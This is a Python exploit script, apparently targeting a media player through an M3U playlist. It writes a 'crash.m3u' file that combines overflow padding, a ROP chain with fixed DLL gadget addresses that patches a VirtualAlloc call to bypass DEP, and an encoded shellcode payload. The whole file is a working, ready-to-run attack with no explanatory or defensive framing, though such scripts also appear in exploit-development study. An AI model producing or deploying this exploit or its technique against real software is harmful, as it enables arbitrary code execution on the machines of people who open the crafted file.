#!/usr/bin/python
 
import sys, struct
 
file="crash.m3u"
total = 28680
offset = 26104
 
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0A'                                            #
#---------------------------------------------------------------------#

#10032078 virtual alloc
rop_nop = struct.pack("<I",0x100102dc) # retn

shellcode =  b""
shellcode += b"\xda\xc0\xb8\xd3\xfd\x71\x7a\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04"
shellcode += b"\x03\x91\xee\x93\x8f\xe9\xf9\xd6\x70\x11\xfa"
shellcode += b"\xb6\xf9\xf4\xcb\xf6\x9e\x7d\x7b\xc7\xd5\xd3"
shellcode += b"\x70\xac\xb8\xc7\x03\xc0\x14\xe8\xa4\x6f\x43"
shellcode += b"\xc7\x35\xc3\xb7\x46\xb6\x1e\xe4\xa8\x87\xd0"
shellcode += b"\xf9\xa9\xc0\x0d\xf3\xfb\x99\x5a\xa6\xeb\xae"
shellcode += b"\x17\x7b\x80\xfd\xb6\xfb\x75\xb5\xb9\x2a\x28"
shellcode += b"\xcd\xe3\xec\xcb\x02\x98\xa4\xd3\x47\xa5\x7f"
shellcode += b"\x68\xb3\x51\x7e\xb8\x8d\x9a\x2d\x85\x21\x69"
shellcode += b"\x2f\xc2\x86\x92\x5a\x3a\xf5\x2f\x5d\xf9\x87"
shellcode += b"\xeb\xe8\x19\x2f\x7f\x4a\xc5\xd1\xac\x0d\x8e"
shellcode += b"\xde\x19\x59\xc8\xc2\x9c\x8e\x63\xfe\x15\x31"
shellcode += b"\xa3\x76\x6d\x16\x67\xd2\x35\x37\x3e\xbe\x98"
shellcode += b"\x48\x20\x61\x44\xed\x2b\x8c\x91\x9c\x76\xd9"
shellcode += b"\x56\xad\x88\x19\xf1\xa6\xfb\x2b\x5e\x1d\x93"
shellcode += b"\x07\x17\xbb\x64\x67\x02\x7b\xfa\x96\xad\x7c"
shellcode += b"\xd3\x5c\xf9\x2c\x4b\x74\x82\xa6\x8b\x79\x57"
shellcode += b"\x68\xdb\xd5\x08\xc9\x8b\x95\xf8\xa1\xc1\x19"
shellcode += b"\x26\xd1\xea\xf3\x4f\x78\x11\x94\xaf\xd5\x6b"
shellcode += b"\xfe\x58\x24\x8b\xce\xa1\xa1\x6d\x44\xc2\xe7"
shellcode += b"\x26\xf1\x7b\xa2\xbc\x60\x83\x78\xb9\xa3\x0f"
shellcode += b"\x8f\x3e\x6d\xf8\xfa\x2c\x1a\x08\xb1\x0e\x8d"
shellcode += b"\x17\x6f\x26\x51\x85\xf4\xb6\x1c\xb6\xa2\xe1"
shellcode += b"\x49\x08\xbb\x67\x64\x33\x15\x95\x75\xa5\x5e"
shellcode += b"\x1d\xa2\x16\x60\x9c\x27\x22\x46\x8e\xf1\xab"
shellcode += b"\xc2\xfa\xad\xfd\x9c\x54\x08\x54\x6f\x0e\xc2"
shellcode += b"\x0b\x39\xc6\x93\x67\xfa\x90\x9b\xad\x8c\x7c"
shellcode += b"\x2d\x18\xc9\x83\x82\xcc\xdd\xfc\xfe\x6c\x21"
shellcode += b"\xd7\xba\x93\xd3\xe5\x56\x03\x4a\x9c\x1a\x49"
shellcode += b"\x6d\x4b\x58\x74\xee\x79\x21\x83\xee\x08\x24"
shellcode += b"\xcf\xa8\xe1\x54\x40\x5d\x05\xca\x61\x74"
shellcode += b"\x90" * (500 - len(shellcode))


#step 1 - saving esp in eax and edi
rop = struct.pack("<L", 0x10014026)  # POP ESI # RETN  
rop += struct.pack("<L", 0xffffaa30)
rop += struct.pack("<L", 0x1002cc3e)  # ADD EBX,ESI # STC # RETN 
rop += struct.pack("<L", 0x10012ab1)  # MOV EAX,EBX # POP EBP # POP EBX # RETN  
rop += struct.pack("<L", 0x41414141)  # padding ebp
rop += struct.pack("<L", 0x41414141)  # padding ebx

#jumping over template
rop += struct.pack("<L", 0x100201a3)  # ADD ESP,1C # RETN    

rop += struct.pack("<L", 0x10032078) # dummy VirutalAlloc Address (pointer to VirtualProtect) 
rop += struct.pack("<L", 0x55555555) # Shellcode Return Address (pointer to shellcode address)
rop += struct.pack("<L", 0x44444444) # # dummy Shellcode Address  (pointer to shellcode address)
rop += struct.pack("<L", 0x33333333) # dummy dwSize  - 0x1
rop += struct.pack("<L", 0x22222222) # # dummy flAllocationType  - 0x1000
rop += struct.pack("<L", 0x11111111) # dummy flProtect - 0x40

rop += b"\x90"*4
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x100128f7)  # PUSH EAX # POP EDI # POP ESI # POP EBX # RETN 
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebx

rop += struct.pack("<L", 0x1001bdee)  # PUSH EAX # MOV EAX,1 # POP EBX # ADD ESP,8 # RETN 
rop += struct.pack("<L", 0x41414141)  # padding add esp
rop += struct.pack("<L", 0x41414141)  # padding add esp
rop += struct.pack("<L", 0x100253ba)  # XOR EAX,EAX # XOR EDX,EDX # RETN 
rop += struct.pack("<L", 0x10024ece)  # ADD EDX,EBX # POP EBX # RETN 0x10 
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += rop_nop
rop += struct.pack("<L", 0x1001741e) # ADD EAX,EDX # RETN 

rop += struct.pack("<L", 0x1002e0c8)  # MOV EAX,DWORD PTR [EAX] # RETN    **
rop += struct.pack("<L", 0x1002e0c8)  # MOV EAX,DWORD PTR [EAX] # RETN    **
rop += struct.pack("<L", 0x1001fcbb)  # MOV DWORD PTR [EDI],EAX # MOV EAX,ESI # POP EDI # POP ESI # POP EBP # RETN 
rop += struct.pack("<L", 0x41414141)  # padding edi
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebp

#step 2 - patching ret address
rop += struct.pack("<L", 0x10024075)  # XOR EAX,EAX # RETN 
rop += struct.pack("<L", 0x1001741e)  # ADD EAX,EDX # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x100128f7)  # PUSH EAX # POP EDI # POP ESI # POP EBX # RETN 
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += struct.pack("<L", 0x1001e84e)  # POP ECX # RETN
rop += struct.pack("<L", 0xfffffbd4)  # -42c
rop += struct.pack("<L", 0x10027dae)  # SUB EAX,ECX # RETN  
rop += struct.pack("<L", 0x1001fcbb)  # MOV DWORD PTR [EDI],EAX # MOV EAX,ESI # POP EDI # POP ESI # POP EBP # RETN 
rop += struct.pack("<L", 0x41414141)  # padding edi
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebp

#step 3 - patching Shellcode address
rop += struct.pack("<L", 0x10024075)  # XOR EAX,EAX # RETN 
rop += struct.pack("<L", 0x1001741e)  # ADD EAX,EDX # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x100128f7)  # PUSH EAX # POP EDI # POP ESI # POP EBX # RETN 
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += struct.pack("<L", 0x1001e84e)  # POP ECX # RETN
rop += struct.pack("<L", 0xfffffbd8)  # -428
rop += struct.pack("<L", 0x10027dae)  # SUB EAX,ECX # RETN  
rop += struct.pack("<L", 0x1001fcbb)  # MOV DWORD PTR [EDI],EAX # MOV EAX,ESI # POP EDI # POP ESI # POP EBP # RETN 
rop += struct.pack("<L", 0x41414141)  # padding edi
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebp

#step 4 - dwsize 0x1
rop += struct.pack("<L", 0x10024075)  # XOR EAX,EAX # RETN 
rop += struct.pack("<L", 0x1001741e)  # ADD EAX,EDX # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x100128f7)  # PUSH EAX # POP EDI # POP ESI # POP EBX # RETN 
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += struct.pack("<L", 0x10024075)  # XOR EAX,EAX # RETN 
rop += struct.pack("<L", 0x10023327)  # INC EAX # RETN  
rop += struct.pack("<L", 0x1001fcbb)  # MOV DWORD PTR [EDI],EAX # MOV EAX,ESI # POP EDI # POP ESI # POP EBP # RETN 
rop += struct.pack("<L", 0x41414141)  # padding edi
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebp

#patching flAllocationType
rop += struct.pack("<L", 0x10024075)  # XOR EAX,EAX # RETN 
rop += struct.pack("<L", 0x1001741e)  # ADD EAX,EDX # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x100128f7)  # PUSH EAX # POP EDI # POP ESI # POP EBX # RETN 
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += struct.pack("<L", 0x1002976e)  # POP EAX # RETN
rop += struct.pack("<L", 0xffffefff)
rop += struct.pack("<L", 0x10023327)  # INC EAX # RETN 
rop += struct.pack("<L", 0x1001e7b4)  # NEG EAX # POP EBX # RETN
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += struct.pack("<L", 0x1001fcbb)  # MOV DWORD PTR [EDI],EAX # MOV EAX,ESI # POP EDI # POP ESI # POP EBP # RETN 
rop += struct.pack("<L", 0x41414141)  # padding edi
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebp

#patching flProtect
rop += struct.pack("<L", 0x10024075)  # XOR EAX,EAX # RETN 
rop += struct.pack("<L", 0x1001741e)  # ADD EAX,EDX # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x1001d2ac)  # ADD EAX,4 # RETN
rop += struct.pack("<L", 0x100128f7)  # PUSH EAX # POP EDI # POP ESI # POP EBX # RETN 
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += struct.pack("<L", 0x1002976e)  # POP EAX # RETN
rop += struct.pack("<L", 0xffffffc0)
rop += struct.pack("<L", 0x1001e7b4)  # NEG EAX # POP EBX # RETN
rop += struct.pack("<L", 0x41414141)  # padding ebx
rop += struct.pack("<L", 0x1001fcbb)  # MOV DWORD PTR [EDI],EAX # MOV EAX,ESI # POP EDI # POP ESI # POP EBP # RETN 
rop += struct.pack("<L", 0x41414141)  # padding edi
rop += struct.pack("<L", 0x41414141)  # padding esi
rop += struct.pack("<L", 0x41414141)  # padding ebp

#restoring esp
rop += struct.pack("<L", 0x10024075)  # XOR EAX,EAX # RETN 
rop += struct.pack("<L", 0x1001741e)  # ADD EAX,EDX # RETN
rop += struct.pack("<L", 0x1002be41)  # XCHG EAX,ESP # RETN

print((1100 - len(rop)))
rop += b"\x90" * (1100 - len(rop))

crash = b"http://." + b"A" * offset
crash += rop_nop
crash += b"\x90"*4
crash += rop
crash += shellcode
crash += b"C"* (total - len(crash))
 
writeFile = open (file, "wb")
writeFile.write( crash )
writeFile.close()
